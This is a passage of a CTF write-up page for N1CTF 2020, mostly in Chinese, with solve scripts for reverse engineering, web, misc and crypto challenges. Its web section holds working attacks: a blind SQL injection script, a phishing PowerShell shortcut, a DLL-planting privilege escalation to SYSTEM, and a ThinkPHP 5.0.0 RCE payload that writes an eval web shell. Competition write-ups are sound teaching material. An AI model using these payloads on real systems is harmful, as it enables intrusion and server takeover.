+d[<span class="hljs-number">3</span>] = d[<span class="hljs-number">2</span>] ^ d[<span class="hljs-number">3</span>] ^ d[<span class="hljs-number">0</span>]
+kk = (d[<span class="hljs-number">4</span>] ^ d[<span class="hljs-number">1</span>] ^ (d[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">3</span>)) &amp; <span class="hljs-number">0xff</span>
+d[<span class="hljs-number">1</span>] = ((kk &gt;&gt; <span class="hljs-number">1</span>) | ((d[<span class="hljs-number">4</span>] ^ d[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">7</span>)) &amp; <span class="hljs-number">0xff</span>
+d[<span class="hljs-number">4</span>] = rol(d[<span class="hljs-number">4</span>], <span class="hljs-number">4</span>)
+d[<span class="hljs-number">0</span>] = (d[<span class="hljs-number">0</span>] ^ d[<span class="hljs-number">4</span>] ^ (kk &lt;&lt; <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xff</span>
+res = [<span class="hljs-number">0x59</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x04</span>]
+s.add(d[<span class="hljs-number">0</span>] == res[<span class="hljs-number">0</span>])
+s.add(d[<span class="hljs-number">1</span>] == res[<span class="hljs-number">1</span>])
+s.add(d[<span class="hljs-number">2</span>] == res[<span class="hljs-number">2</span>])
+s.add(d[<span class="hljs-number">3</span>] == res[<span class="hljs-number">3</span>])
+s.add(d[<span class="hljs-number">4</span>] == res[<span class="hljs-number">4</span>])
+<span class="hljs-keyword">assert</span> s.check() == sat
+m = s.model()
+d = <span class="hljs-string">b""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:
+    d += bytes([m[i].as_long()])
+
+e = <span class="hljs-number">6167994677750637846787284031284198699166724915292914207416625769922807110688701075146631681903787645131506509092609320621680335996011774133185924915744219183246974202510061588080450525756895523022680363592573974409387577754216307554444653180967764812466382206303916522606490290560284293010748494659520932252400522132701503847731262931700009254884130125557658811643798175788587564577224264756167863381391234404013004010044434222103569714559454690179319609962742145774093818530050466364779170297899996215415882749698196692126283911687170238829459195201541686347648768736129003321187960266022395285700138347393691701069800248507644296815948904642976231288390406392891137494265832494759401573097210850114663153274313756537534018109589206570602540559326039200848716638617367713171988711893402604262898551564788694015795986970388491176582531665735658490435481200684917725457390389445927207017739551104899293208031894691597567751372316173235969218701236129333475312126687483726518198884513431441373732322137387513411186113815489008204909882767211169670588119365268975311156035629164815032021033896627248205135889384062142533117427126174095664288229688983857514052912429373540989636730411614444500275895553786288524905672481290914962230663942978711977191617065355285376252300919856061262086308230629602563968135550187794697940223487471707339180184560459695301837543872635681488327980744438810932238175173336910108067161104524934145719389582851097368935750517077890034754480445239796065956023382953081104391321505492418879642843744083771488220776322694705558795406301099726143053265877629581376259736759379188070314677590380180875273589564613559077305039931521532889492874654116461687721433729560604345053665295353236076664587087994310194406827022786656499847672193385624034515585768388568701635965244814323298597210348083543194600191130177132309986678969373551829442002747485311866575378350703527238711102095369384336356910404004469356190806173157632587752829434386287114578291155464880709213641422876002393911662603315051364986980980896704848929494530865685081868837652490605249636514235057182207702952321657454456321540781618152251278528268041930821982417146538319344639262942409287413758365258936719585888245823584824787839695792942350835975325889291159555569773698908762648328204484224374476005032892196588715683423064219222095210187956084050428453531372674950072726211172825585275037410644186218960539109203196375294568056346977690840547747822508969530870855717294746523948068657810545614758240263248907656864643160983042403080961181298595656632900922716579858394871958904348170040153453056274611115019806506784108202367951401353592710709416624855402518608477578191464102129214837978994562796271286110818402775533844116138832972397140813091516932287622012692130454886149279432122660261892989759781348004545029997150326044796872548795315202824218021068605447949528282532753984199427360981380117727924707097097567755338759071037135582068677841242604984336821824912907298987321024269757948506834116030717378803260595543851757773593544092953717412777765946902006422552357788941850994131011985300156956761652763512117337592141362903770443640417077587868843401739463946011976427366277535691415538303315680898571953720879996801759034877085380157983224998649271609665774965177001138337677090025872131388597130451372531363</span>
+e = bin(int(math.log(e, <span class="hljs-number">3</span>)))
+ee = e[<span class="hljs-number">2</span>::][::<span class="hljs-number">-1</span>]
+e = <span class="hljs-string">b""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ee:
+    <span class="hljs-keyword">if</span> i == <span class="hljs-string">'1'</span>:
+        e += <span class="hljs-string">b"Z"</span>
+    <span class="hljs-keyword">else</span>:
+        e += <span class="hljs-string">b"z"</span>
+print(a + <span class="hljs-string">b"_"</span> + b + <span class="hljs-string">b"_"</span> + c + <span class="hljs-string">b"_"</span> + d + <span class="hljs-string">b"_"</span> + e)</code></pre><h3 id="easy-apk"><a class="header-link" href="#easy-apk"></a>easy apk</h3>
+<p>ollvm，调试分析算法
+替换表的base64+aes_cbc</p>
+<pre class="hljs"><code>tbl = list(b<span class="hljs-string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-/"</span>)
+res = b<span class="hljs-string">"jZe3yJG3zJLHywu4otmZzwy/"</span>
+a = b<span class="hljs-string">""</span>
+for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(res), <span class="hljs-number">4</span>):
+    t = list(map(lambda x: tbl.index(x), list(res[i:i+<span class="hljs-number">4</span>])))
+    s = [<span class="hljs-number">0</span> for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)]
+    s[<span class="hljs-number">0</span>] = ((t[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x3f</span>) &lt;&lt; <span class="hljs-number">2</span>) | ((t[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>)
+    s[<span class="hljs-number">1</span>] = ((t[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0xf</span>) &lt;&lt; <span class="hljs-number">4</span>) | ((t[<span class="hljs-number">2</span>]&gt;&gt;<span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xf</span>)
+    s[<span class="hljs-number">2</span>] = (t[<span class="hljs-number">3</span>] &amp; <span class="hljs-number">0x3f</span>) | ((t[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>)
+    a += bytes(s)
+f1 = a[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]
+
+<span class="hljs-built_in">k2</span> = b<span class="hljs-string">"17b87f9aae8933ef"</span>
+<span class="hljs-built_in">k1</span> = b<span class="hljs-string">"'17b87f9aae8933efn1ctf{}"</span>
+cipher = b<span class="hljs-string">"'7890123456789012"</span>
+res = bytes([<span class="hljs-number">0xA5</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x55</span>])
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+aes = AES.new(<span class="hljs-built_in">k1</span>, iv=<span class="hljs-built_in">k2</span>[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>], mode=AES.MODE_CBC)
+cipher = pad(cipher, <span class="hljs-number">16</span>)
+f2 = unpad(aes.decrypt(res), <span class="hljs-number">16</span>)[<span class="hljs-number">1</span>:]
+print(b<span class="hljs-string">"n1ctf{"</span> + f1 + f2 + b<span class="hljs-string">"}"</span>)</code></pre><h3 id="n1egg-in-fixed-camera"><a class="header-link" href="#n1egg-in-fixed-camera"></a>N1egg In Fixed Camera</h3>
+<p>彩蛋题，strings一下level0找到flag</p>
+<h3 id="easyre"><a class="header-link" href="#easyre"></a>easyre</h3>
+<p>虚拟机，用异常处理来控制路径，再就没啥了</p>
+<pre class="hljs"><code>import os
+
+def swap_b(<span class="hljs-keyword">x</span>):
+    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">x</span>&lt;&lt;<span class="hljs-number">4</span>)&amp;<span class="hljs-number">0</span>xf0 | (<span class="hljs-keyword">x</span>&gt;&gt;<span class="hljs-number">4</span>)&amp;<span class="hljs-number">0</span>xf
+
+stack = [<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x4e]
+
+flag = [<span class="hljs-number">0</span>x43 <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>x64)]
+flag[<span class="hljs-number">0</span>] = ord(<span class="hljs-string">'n'</span>)
+flag[<span class="hljs-number">1</span>] = ord(<span class="hljs-string">'1'</span>)
+flag[<span class="hljs-number">2</span>] = ord(<span class="hljs-string">'c'</span>)
+flag[<span class="hljs-number">3</span>] = ord(<span class="hljs-string">'t'</span>)
+flag[<span class="hljs-number">4</span>] = ord(<span class="hljs-string">'f'</span>)
+flag[<span class="hljs-number">5</span>] = ord(<span class="hljs-string">'{'</span>)
+
+
+# result_i
+#[<span class="hljs-string">'700'</span>, <span class="hljs-string">'500'</span>, <span class="hljs-string">'1056'</span>, <span class="hljs-string">'998'</span>, <span class="hljs-string">'1212'</span>, <span class="hljs-string">'1467'</span>, <span class="hljs-string">'1279'</span>, <span class="hljs-string">'1594'</span>, <span class="hljs-string">'1606'</span>, <span class="hljs-string">'2077'</span>, <span class="hljs-string">'2299'</span>, <span class="hljs-string">'2326'</span>, <span class="hljs-string">'2238'</span>, <span class="hljs-string">'2261'</span>, <span class="hljs-string">'2363'</span>, <span class="hljs-string">'2813'</span>, <span class="hljs-string">'2924'</span>, <span class="hljs-string">'2786'</span>, <span class="hljs-string">'2935'</span>, <span class="hljs-string">'3179'</span>, <span class="hljs-string">'3281'</span>, <span class="hljs-string">'3354'</span>, <span class="hljs-string">'3325'</span>, <span class="hljs-string">'3417'</span>, <span class="hljs-string">'3535'</span>, <span class="hljs-string">'3396'</span>, <span class="hljs-string">'3547'</span>, <span class="hljs-string">'3825'</span>, <span class="hljs-string">'3754'</span>, <span class="hljs-string">'4145'</span>, <span class="hljs-string">'4382'</span>, <span class="hljs-string">'4423'</span>, <span class="hljs-string">'4532'</span>, <span class="hljs-string">'4489'</span>, <span class="hljs-string">'4766'</span>, <span class="hljs-string">'4769'</span>, <span class="hljs-string">'4701'</span>, <span class="hljs-string">'4911'</span>, <span class="hljs-string">'5133'</span>, <span class="hljs-string">'5078'</span>, <span class="hljs-string">'5084'</span>, <span class="hljs-string">'5059'</span>, <span class="hljs-string">'5496'</span>, <span class="hljs-string">'5499'</span>, <span class="hljs-string">'5483'</span>, <span class="hljs-string">'5484'</span>, <span class="hljs-string">'6176'</span>, <span class="hljs-string">'6203'</span>, <span class="hljs-string">'6276'</span>, <span class="hljs-string">'6044'</span>, <span class="hljs-string">'6729'</span>, <span class="hljs-string">'6668'</span>, <span class="hljs-string">'6906'</span>, <span class="hljs-string">'6965'</span>, <span class="hljs-string">'6886'</span>, <span class="hljs-string">'7134'</span>, <span class="hljs-string">''</span>]
+fp = <span class="hljs-keyword">open</span>(<span class="hljs-string">"result_i"</span>,<span class="hljs-string">'rb'</span>)
+result = fp.<span class="hljs-keyword">read</span>()
+fp.<span class="hljs-keyword">close</span>()
+
+result = result.<span class="hljs-keyword">split</span>(<span class="hljs-string">'\n'</span>)
+<span class="hljs-keyword">print</span> result
+
+<span class="hljs-keyword">f</span> = <span class="hljs-number">1</span>
+
+# flag[<span class="hljs-number">6</span>] = flag[<span class="hljs-number">6</span>] ^ stack[<span class="hljs-number">0</span>]
+# stack[<span class="hljs-number">0</span>] = flag[<span class="hljs-number">6</span>]
+
+summ = <span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+    summ += flag[i]
+<span class="hljs-keyword">print</span> summ
+
+xchange_t = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]
+<span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
+    <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
+        xchange_t.<span class="hljs-keyword">append</span>(<span class="hljs-number">1</span>)
+        xchange_t.<span class="hljs-keyword">append</span>(<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">else</span>:
+        xchange_t.<span class="hljs-keyword">append</span>(<span class="hljs-number">0</span>)
+        xchange_t.<span class="hljs-keyword">append</span>(<span class="hljs-number">0</span>)
+
+i = <span class="hljs-number">0</span>
+<span class="hljs-keyword">while</span> True:
+    <span class="hljs-keyword">if</span> i &gt; <span class="hljs-built_in">len</span>(result)-<span class="hljs-number">2</span>:
+        <span class="hljs-keyword">break</span>
+    #print result[i]
+    <span class="hljs-keyword">x</span> = <span class="hljs-built_in">abs</span>(<span class="hljs-keyword">int</span>(result[i],<span class="hljs-number">10</span>) - summ)
+    <span class="hljs-keyword">print</span> <span class="hljs-keyword">x</span>
+    <span class="hljs-keyword">if</span> xchange_t[i+<span class="hljs-number">6</span>] == <span class="hljs-number">0</span>:
+        flag[i+<span class="hljs-number">6</span>] = <span class="hljs-keyword">x</span> ^ stack[<span class="hljs-number">0</span>]
+        stack[<span class="hljs-number">0</span>] = <span class="hljs-keyword">x</span>
+    <span class="hljs-keyword">else</span>:
+        flag[i+<span class="hljs-number">6</span>] = <span class="hljs-keyword">x</span> ^ stack[<span class="hljs-number">1</span>]
+        flag[i+<span class="hljs-number">6</span>] = swap_b(flag[i+<span class="hljs-number">6</span>])
+        stack[<span class="hljs-number">1</span>] = <span class="hljs-keyword">x</span>
+    summ += <span class="hljs-keyword">x</span>
+    i += <span class="hljs-number">1</span>
+
+<span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([chr(<span class="hljs-keyword">x</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in flag])
+
+
+# <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>x40):
+#     <span class="hljs-keyword">print</span> <span class="hljs-string">'flag['</span> + hex(i)[<span class="hljs-number">2</span>:] + <span class="hljs-string">']:'</span> + hex(flag[i])
+
+# summ = <span class="hljs-number">0</span>
+# <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+#     summ += flag[i]
+# <span class="hljs-keyword">print</span> summ</code></pre><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="signln"><a class="header-link" href="#signln"></a>Signln</h3>
+<pre class="hljs"><code>import requests
+import string
+import re
+
+url = <span class="hljs-string">"http://101.32.205.189/?input=O%3A4%3A%22flag%22%3A2%3A%7Bs%3A2%3A%22ip%22%3Bs%3A9%3A%22callmecro%22%3Bs%3A5%3A%22check%22%3Bs%3A25%3A%22n1ctf20205bf75ab0a30dfc0c%22%3B%7D"</span>
+
+characters = string.printable[:-<span class="hljs-number">5</span>]
+r = requests.get(url)
+<span class="hljs-keyword">if</span> <span class="hljs-string">"n1ctf{"</span> in r.text:
+    flag = <span class="hljs-string">""</span>.join(re.findall(r<span class="hljs-string">'n1ctf{.*}'</span>,r.text))
+    <span class="hljs-keyword">exit</span>(flag)
+
+sql =<span class="hljs-string">"select `key` from n1key"</span>
+<span class="hljs-keyword">exp</span> = <span class="hljs-string">"'||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((%s),%d,1))=%d,'n1ctf','callmecro')),'~'),3))||'"</span>
+
+res = <span class="hljs-string">""</span>
+
+<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
+    flag = True
+    <span class="hljs-keyword">for</span> char in characters:
+        payload = <span class="hljs-keyword">exp</span> % (sql, i, <span class="hljs-keyword">ord</span>(char))
+        <span class="hljs-comment">#payload = exp</span>
+        headers = {
+            <span class="hljs-string">"X-Forwarded-For"</span>:payload
+        }
+        r = requests.get(url,headers=headers)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'welcome to n1ctf2020&lt;'</span> in r.text:
+            res += char
+            <span class="hljs-keyword">print</span>(res)
+            flag = False
+            <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">if</span> flag:
+        <span class="hljs-keyword">break</span>
+<span class="hljs-comment"># key = n1ctf20205bf75ab0a30dfc0c</span></code></pre><h3 id="the-king-of-phish(victim-bot)"><a class="header-link" href="#the-king-of-phish(victim-bot)"></a>The king of phish(victim-bot)</h3>
+<p>创建类似这样的powershell的快捷方式</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">powershell</span></span> -exec bypass -encodedCommand blahblah...</code></pre><p>然后手工更改lnk文件里面的0x20为0x09
+直接发过去就上线了</p>
+<h3 id="the-king-of-phish(usera-pc)"><a class="header-link" href="#the-king-of-phish(usera-pc)"></a>The king of phish(UserA-PC)</h3>
+<p>上去一看whoami开了SeRestorePrivilege，思路就很明显了。
+这是超级权限，允许修改任何文件和任何注册表。。。</p>
+<p>用usodllloader，写个自己的WindowsCoreDeviceInfo.dll，CreateFile的时候带上FILE_FLAG_BACKUP_SEMANTICS，直接写入system32文件夹。</p>
+<p>触发加载直接得到system的shell。</p>
+<h3 id="zabbix_fun"><a class="header-link" href="#zabbix_fun"></a>zabbix_fun</h3>
+<p>首先<code>Admin</code> <code>zabbix</code>登录。查看下agent的ip地址
+<img src="https://i.imgur.com/0V2kMt2.png" alt="">
+之后配置host，使能zbx
+<img src="https://i.imgur.com/N35vcMr.png" alt="">
+再用监控项(item)读文件就行了
+<img src="https://i.imgur.com/x2Bzi9J.png" alt=""></p>
+<h3 id="easy_tp5"><a class="header-link" href="#easy_tp5"></a>easy_tp5</h3>
+<p>发现tp版本是5.0.0，存在RCE的payload，但是由于open_basedir的设置和disabled_functions，导致了无法执行命令。</p>
+<p>所以思路就是往web目录下面写一个自己的shell，这样就可以逃出这个漏洞的限制，找到了Build类的module方法</p>
+<p>在其中的buildHello方法中，存在写文件的操作，通过构造payload即可往public下面写一个Index.php文件</p>
+<p class="img-container"><img src="https://i.imgur.com/lSmGtFj.png" alt=""></p>
+<p>但是因为我们只能调用一个参数的函数，并且这个参数必须要是字符串，所以我们要向上找一步，发现module方法完全符合我们的要求，所以利用这一点，我们就可以写一个shell：</p>
+<p class="img-container"><img src="https://i.imgur.com/EpWrk73.png" alt=""></p>
+<p>因为pathinfo的原因，需要找到一个包含，而不能直接访问我们的文件，所以使用Loader类的__include_file来包含刚才写的文件，进而getshell</p>
+<p>payload：
+写文件：</p>
+<p><code>_method=__construct&amp;filter[]=think\Build::module&amp;method=GET&amp;get[]=index//../../public/?&gt;&lt;?php eval($_REQUEST[1]);</code></p>
+<p>包含文件<code>_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=/var/www/html/public/?&gt;&lt;?php eval($_REQUEST[1]);/controller/Index.php</code></p>
+<p>最后利用蚁剑连上去，一键bypass disable_function就可以了</p>
+<p class="img-container"><img src="https://i.imgur.com/ZDecAtx.png" alt=""></p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>misc</h2>
+<h3 id="signln-1"><a class="header-link" href="#signln-1"></a>Signln</h3>
+<p>Welcome to N1CTF 2020.</p>
+<p>n1ctf{welc0m3_to_n1ctf2020_ctfers}</p>
+<h3 id="allsignin"><a class="header-link" href="#allsignin"></a>AllSignIn</h3>
+<p class="img-container"><img src="https://i.imgur.com/sQtOW3F.png" alt=""></p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="vss"><a class="header-link" href="#vss"></a>vss</h3>
+<p>预测随机数
+<a href="https://github.com/kmyk/mersenne-twister-predictor/blob/master/mt19937predictor.py">https://github.com/kmyk/mersenne-twister-predictor/blob/master/mt19937predictor.py</a></p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
+<span class="hljs-keyword">import</span> qrcode
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">from</span> mt19937predictor <span class="hljs-keyword">import</span> MT19937Predictor
+
+im = Image.open(<span class="hljs-string">"share2.png"</span>)
+m,n = im.size
+m //= <span class="hljs-number">2</span>
+n //= <span class="hljs-number">2</span>
+f = []
+<span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> range(n*m):
+    i, j = idx//n, idx % n
+    a1=im.getpixel((<span class="hljs-number">2</span>*j,<span class="hljs-number">2</span>*i))
+    a2=im.getpixel((<span class="hljs-number">2</span>*j,<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>))
+    a3=im.getpixel((<span class="hljs-number">2</span>*j+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>*i))
+    a4=im.getpixel((<span class="hljs-number">2</span>*j+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>))
+    <span class="hljs-keyword">assert</span> a1==a2 <span class="hljs-keyword">and</span> a3==a4
+    c = a1 &amp; <span class="hljs-number">1</span>
+    <span class="hljs-comment"># pixel ^ flip == c</span>
+    f.append(c)
+
+qr = qrcode.QRCode(
+    version=<span class="hljs-number">1</span>,
+    error_correction=qrcode.constants.ERROR_CORRECT_L,
+    box_size=<span class="hljs-number">12</span>,
+    border=<span class="hljs-number">4</span>,
+)
+
+<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):
+    FLAG=<span class="hljs-string">'n1ctf{'</span>+<span class="hljs-string">''</span>.join(random.choice(<span class="hljs-string">'abcdef-_1234567890'</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(l))+<span class="hljs-string">'}'</span>
+    qr.add_data(FLAG)
+    qr.make(fit=<span class="hljs-keyword">True</span>)
+    img = qr.make_image(fill_color=<span class="hljs-string">"black"</span>, back_color=<span class="hljs-string">"white"</span>)
+    <span class="hljs-keyword">if</span> img.size[<span class="hljs-number">0</span>] == <span class="hljs-number">444</span> <span class="hljs-keyword">and</span> img.size[<span class="hljs-number">1</span>] == <span class="hljs-number">444</span>:
+        img.save(<span class="hljs-string">'test.png'</span>)
+        <span class="hljs-keyword">break</span>
+
+l = <span class="hljs-number">624</span>*<span class="hljs-number">32</span>
+<span class="hljs-comment">#l = len(data) &amp; (~0b11111)</span>
+data = [x&amp;<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list(img.getdata())[-l:]]
+flip = [x^y <span class="hljs-keyword">for</span> x,y <span class="hljs-keyword">in</span> zip(data,f[-l:])]
+r = <span class="hljs-string">''</span>.join(chr(x+<span class="hljs-number">48</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flip)
+r = int(r, <span class="hljs-number">2</span>)
+pred = MT19937Predictor()
+pred.setrandbits(r, l)
+bits = pred.getrandbits(<span class="hljs-number">444</span>*<span class="hljs-number">444</span>-l)
+bits = bin(bits)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">444</span>*<span class="hljs-number">444</span>-l, <span class="hljs-string">'0'</span>)
+flip = [int(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bits] + flip
+
+im = Image.new(<span class="hljs-string">"L"</span>, (m,n))
+data = [(x ^ y)*<span class="hljs-number">255</span> <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> zip(f, flip)]
+im.putdata(data)
+im.save(<span class="hljs-string">'qr.png'</span>)</code></pre><h3 id="curve"><a class="header-link" href="#curve"></a>curve</h3>
+<p>看上去像是 ECDH 的 DDH 问题, 但是实际上 smart attack 直接求 dlp 就行了. 一次 2 秒, 30 次 90 秒以内没问题.</p>
+<pre class="hljs"><code><span class="hljs-comment"># generate curve</span>
+p = <span class="hljs-number">0</span>
+m = <span class="hljs-number">2</span>^<span class="hljs-number">256</span>
+<span class="hljs-keyword">while</span> p <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> Primes():
+    p = <span class="hljs-number">11</span>*m*(m + <span class="hljs-number">1</span>) + <span class="hljs-number">3</span>
+    m += <span class="hljs-number">1</span>
+E=EllipticCurve(GF(p), j=<span class="hljs-number">-2</span>^<span class="hljs-number">15</span>)
+<span class="hljs-keyword">if</span> E.order() != p:
+    E=E.quadratic_twist()
+
+<span class="hljs-comment"># attack</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):
+    s = io.recvline()
+
+    l = s.decode().split(<span class="hljs-string">"("</span>)
+
+    g0 = E(eval(<span class="hljs-string">"("</span>+l[<span class="hljs-number">-3</span>].replace(<span class="hljs-string">":"</span>,<span class="hljs-string">","</span>)))
+    g1 = E(eval(<span class="hljs-string">"("</span>+l[<span class="hljs-number">-2</span>].replace(<span class="hljs-string">":"</span>,<span class="hljs-string">","</span>)))
+    c01 = E(eval(<span class="hljs-string">"("</span>+l[<span class="hljs-number">-1</span>].replace(<span class="hljs-string">":"</span>,<span class="hljs-string">","</span>)))
+
+    k = SmartAttack(P,g1,p)
+
+    <span class="hljs-keyword">if</span> k*g0 == c01:
+        io.sendline(<span class="hljs-string">"0"</span>)
+    <span class="hljs-keyword">else</span>:
+        io.sendline(<span class="hljs-string">"1"</span>)</code></pre><p><em>注: 因为是 jupyter 所以懒得一个个 block 去 copy, 也懒得导出代码再排版, 就贴一下关键代码, 下同</em></p>
+<h3 id="flagbot"><a class="header-link" href="#flagbot"></a>FlagBot</h3>
+<p>注意到 secret 被公用, 可求其模不同 order 的阶再 CRT. 这里只选择小于 2^40 的阶:</p>
+<pre class="hljs"><code><span class="hljs-comment"># factor order</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
+    o = gens[i].order()
+    k = <span class="hljs-number">1</span>
+    kk = list(factor(o/k))[<span class="hljs-number">-1</span>][<span class="hljs-number">0</span>]
+    <span class="hljs-keyword">while</span> kk &gt; <span class="hljs-number">2</span>^<span class="hljs-number">40</span>:
+        k *= kk
+        kk = list(factor(o/k))[<span class="hljs-number">-1</span>][<span class="hljs-number">0</span>]
+    rgens.append(k*gens[i])
+    rpubs.append(k*pubs[i])
+    rorder.append(rgens[i].order())
+
+<span class="hljs-comment"># dlp</span>
+o = <span class="hljs-number">1</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
+    o = lcm(o,rorder[i])
+    print(factor(rorder[i]))
+    rsecret.append(rgens[i].discrete_log(rpubs[i]))
+    print(o)
+    print(o &gt; <span class="hljs-number">2</span>^<span class="hljs-number">255</span>)
+
+<span class="hljs-comment"># crt</span>
+secret = rsecret[<span class="hljs-number">0</span>]
+o = rorder[<span class="hljs-number">0</span>]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):
+    secret = crt(secret,rsecret[i],o,rorder[i])
+    o = lcm(o,rorder[i])
+    print(secret)</code></pre><h3 id="babyproof"><a class="header-link" href="#babyproof"></a>BabyProof</h3>
+<p>没看懂跟 ZKP 有啥关系, 但是一看就是类似于 DSA 的 LLL. 大概先估算一下需要 60 组数据比较稳妥 ( $247 &gt; 256*n/(n+1) - log(n)/2$ ). 但是因为速度太慢就只要了 44 组数据.</p>
+<pre class="hljs"><code>M = Matrix(ZZ, m+<span class="hljs-number">2</span>,m+<span class="hljs-number">2</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(m):
+    M[i,i] = qs[i]
+    M[<span class="hljs-number">-2</span>,i] = cs[i]
+    M[<span class="hljs-number">-1</span>,i] = rs[i]
+M[<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>] = <span class="hljs-number">2</span>^<span class="hljs-number">246</span>
+M[<span class="hljs-number">-2</span>,<span class="hljs-number">-2</span>] = <span class="hljs-number">1</span></code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
